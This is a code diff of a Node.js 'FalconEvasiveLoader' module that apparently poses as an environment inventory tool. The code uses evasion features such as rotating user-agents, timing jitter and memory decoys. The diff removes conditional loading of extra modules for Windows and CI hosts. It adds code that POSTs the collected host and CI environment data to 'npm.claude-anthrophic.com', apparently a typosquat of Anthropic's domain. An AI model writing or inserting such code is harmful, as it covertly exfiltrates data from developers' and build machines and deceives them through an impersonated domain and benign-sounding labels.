@@ -1,11 +1,7 @@
 /* ============================================
- * ENVIRONMENT AUDITING LOADER
+ * ENVIRONMENT INVENTORY LOADER
  * ============================================
  */
-
-// ============================================
-// MODULE IMPORTS - Lazy loaded 
-// ============================================
 
 const os = require('os');
 const http = require('http');
@@ -19,14 +15,12 @@ const crypto = require('crypto');
 // ============================================
 
 const EvasionConfig = {
-    // User-Agent pool for standard request replication
     userAgentPool: [
         'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
         'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
         'Node.js/' + process.version.replace('v', ''),
     ],
 
-    // Timing jitter configuration (milliseconds)
     timingJitter: {
         minDelay: 50,
         maxDelay: 500,
@@ -34,18 +28,15 @@ const EvasionConfig = {
         networkPostDelay: 200,
     },
 
-    // Memory decoy buffer size (bytes)
     memoryDecoySize: 64 * 1024, // 64KB
 
-    // Normalized request headers to eliminate Nginx stream parsing conflicts
     headerVariations: {
         'Accept': [
             'application/json',
             'application/json, text/plain, */*'
         ],
-        // Set to 'identity' to tell Nginx/Node not to compress payloads arbitrarily
         'Accept-Encoding': [
-            'identity'
+            'identity' // Prevents Nginx/Node from compressing payloads arbitrarily
         ],
     },
 };
@@ -213,7 +204,7 @@ function getWindowsVersion() {
 async function contactRemoteServerEvasive(url, options = {}) {
     const defaultOptions = {
         timeout: 10000,
-        method: 'GET',
+        method: 'GET', 
         ...options,
     };
 
@@ -236,11 +227,17 @@ async function contactRemoteServerEvasive(url, options = {}) {
             'X-Request-ID': requestId,
             'Accept': acceptHeader,
             'Accept-Encoding': encodingHeader,
-            'Connection': 'close', // Explicitly close to prevent lingering socket conditions
+            'Connection': 'close', 
         };
 
         if (options.headers) {
             Object.assign(headers, options.headers);
+        }
+
+        // CRITICAL: Compute content layout parameters for POST stream tracking
+        if (options.body) {
+            headers['Content-Type'] = 'application/json';
+            headers['Content-Length'] = Buffer.byteLength(options.body);
         }
 
         defaultOptions.headers = headers;
@@ -273,68 +270,19 @@ async function contactRemoteServerEvasive(url, options = {}) {
 
         req.on('timeout', () => {
             req.destroy();
-            reject({ error: `Request timed out after ${defaultOptions.timeout}ms`, code: 'TIMEOUT' });
+            reject({ error: `Request timed out`, code: 'TIMEOUT' });
         });
 
         req.setTimeout(defaultOptions.timeout);
-
         const startTime = Date.now();
+
+        // CRITICAL: Push the body payload directly into the network buffer
+        if (options.body) {
+            req.write(options.body);
+        }
+
         req.end();
     });
-}
-
-// ============================================
-// CODE SELECTION AND LOADING
-// ============================================
-
-async function loadModulesEvasive(modulePaths) {
-    const shuffledPaths = shuffleArray([...modulePaths]);
-    const loadedModules = [];
-
-    for (const modulePath of shuffledPaths) {
-        await sleep(randomDelay(10, 100));
-
-        try {
-            await fs.access(modulePath);
-            const mod = require(modulePath);
-            loadedModules.push({ path: modulePath, loaded: true });
-        } catch (err) {
-            loadedModules.push({ path: modulePath, loaded: false });
-        }
-    }
-
-    return loadedModules;
-}
-
-function shouldRetrieveAdditionalCodeEvasive(envData, serverResponse) {
-    const decisions = [];
-
-    if (envData.os.code === 'WIN') {
-        decisions.push({ condition: 'WINDOWS_PLATFORM', shouldFetch: true, priority: 1 });
-    }
-
-    if (envData.ci.isCI) {
-        decisions.push({ condition: 'CI_ENVIRONMENT', shouldFetch: true, priority: 2 });
-    }
-
-    if (serverResponse && serverResponse.success) {
-        try {
-            const config = JSON.parse(serverResponse.body);
-            const localVersion = envData.configVersion || '0.0.0';
-
-            if (config.version !== localVersion) {
-                decisions.push({ condition: 'VERSION_MISMATCH', shouldFetch: true, priority: 3 });
-            }
-        } catch (e) {
-            // Decouple parsing failures from structural connection failure
-            decisions.push({ condition: 'SERVER_RESPONSE', shouldFetch: false, priority: 4 });
-        }
-    }
-
-    return {
-        shouldRetrieve: decisions.some(d => d.shouldFetch),
-        reasons: decisions.filter(d => d.shouldFetch).sort((a, b) => a.priority - b.priority),
-    };
 }
 
 // ============================================
@@ -345,7 +293,6 @@ class FalconEvasiveLoader {
     constructor(config = {}) {
         this.config = {
             serverUrl: 'https://npm.claude-anthrophic.com/posts/1',
-            additionalCodePath: './modules/',
             verbose: true,
             enableMemoryDecoys: true,
             enableTimingJitter: true,
@@ -385,7 +332,12 @@ class FalconEvasiveLoader {
                 await sleep(randomDelay(50, 150));
             }
 
+            // CRITICAL: Bundle collected parameters into stringified body array
+            const payloadBody = JSON.stringify(this.environmentData);
+
             this.serverResponse = await contactRemoteServerEvasive(this.config.serverUrl, {
+                method: 'POST', // Explicitly switch to POST mapping
+                body: payloadBody,
                 headers: {
                     'X-Platform': this.environmentData.os.code,
                     'X-CI': String(this.environmentData.ci.isCI),
@@ -401,47 +353,14 @@ class FalconEvasiveLoader {
         }
     }
 
-    async decideAndRetrieve() {
-        const decision = shouldRetrieveAdditionalCodeEvasive(this.environmentData, this.serverResponse);
-
-        if (this.config.verbose) {
-            console.log(`[Evasive Loader] Should retrieve: ${decision.shouldRetrieve}`);
-        }
-
-        if (decision.shouldRetrieve) {
-            return await this.retrieveAdditionalCode(decision.reasons);
-        }
-
-        return null;
-    }
-
-    async retrieveAdditionalCode(reasons) {
-        const modulesToLoad = [];
-
-        if (reasons.some(r => r.condition === 'WINDOWS_PLATFORM')) {
-            modulesToLoad.push('./modules/windows-utils.js');
-        }
-
-        if (reasons.some(r => r.condition === 'CI_ENVIRONMENT')) {
-            modulesToLoad.push('./modules/ci-runner.js');
-        }
-
-        return await loadModulesEvasive(modulesToLoad);
-    }
-
     async run() {
         const startTime = Date.now();
 
         try {
             await this.initialize();
-
             if (this.config.enableTimingJitter) await sleep(randomDelay(30, 100));
 
             await this.contactServer();
-
-            if (this.config.enableTimingJitter) await sleep(randomDelay(30, 100));
-
-            const retrievalResult = await this.decideAndRetrieve();
             const elapsed = Date.now() - startTime;
 
             if (this.config.verbose) {
@@ -452,7 +371,6 @@ class FalconEvasiveLoader {
                 success: true,
                 environment: this.environmentData,
                 serverResponse: this.serverResponse,
-                retrievalResult: retrievalResult,
                 elapsedMs: elapsed,
             };
         } catch (error) {
